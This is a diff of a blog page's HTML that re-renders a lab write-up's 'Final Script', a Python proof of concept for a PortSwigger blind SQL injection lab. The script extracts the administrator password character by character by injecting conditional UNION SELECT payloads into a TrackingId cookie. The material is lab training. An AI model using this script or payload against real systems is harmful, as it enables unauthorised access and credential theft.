@@ -243,36 +243,36 @@ into the {body} of the default.hbs template -->
 
 <h3 id="final-script">Final Script</h3>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 02/01/21</span>
-<span class="c"># blind-sql-lab.py</span>
-<span class="c"># https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses</span>
-<span class="c"># POC script to automate getting the administrator password using blind sql conditional responses</span>
+<pre><code class="language-highlight"># 02/01/21
+# blind-sql-lab.py
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+# POC script to automate getting the administrator password using blind sql conditional responses
 
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">string</span>
+import requests
+import string
 
-<span class="n">url</span> <span class="o">=</span> <span class="s">""</span> <span class="c"># Insert URL here!</span>
+url = "" # Insert URL here!
 
-<span class="n">cookievalue</span> <span class="o">=</span> <span class="s">""</span>
-<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
+cookievalue = ""
+password = ""
 
-<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'TrackingId'</span><span class="p">:</span><span class="n">cookievalue</span><span class="p">}</span>
+cookies = {'TrackingId':cookievalue}
 
-<span class="n">characters</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span>
-<span class="n">characters</span> <span class="o">=</span> <span class="n">characters</span> <span class="o">+</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
+characters = list(string.ascii_lowercase)
+characters = characters + list(string.digits)
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">21</span><span class="p">):</span>
-    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
-        <span class="n">cookievalue</span> <span class="o">=</span> <span class="s">"x'+UNION SELECT+'a' FROM users WHERE username='administrator' AND substring(password,{},1)='{}'--"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">char</span><span class="p">)</span>
-        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'TrackingId'</span><span class="p">:</span><span class="n">cookievalue</span><span class="p">}</span>
-        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
-        <span class="k">if</span> <span class="s">"Welcome back!"</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
-            <span class="n">password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">char</span>
+for i in range(1,21):
+    for char in characters:
+        cookievalue = "x'+UNION SELECT+'a' FROM users WHERE username='administrator' AND substring(password,{},1)='{}'--".format(i,char)
+        cookies = {'TrackingId':cookievalue}
+        r = requests.get(url, cookies=cookies)
+        response = r.text
+        if "Welcome back!" in response:
+            print(char)
+            password = password + char
             
-<span class="k">print</span><span class="p">(</span><span class="s">"Password is: "</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
-</code></pre></div></div>
+print("Password is: " + password)
+</code></pre>
 
 <h3 id="next-steps">Next Steps</h3>
 
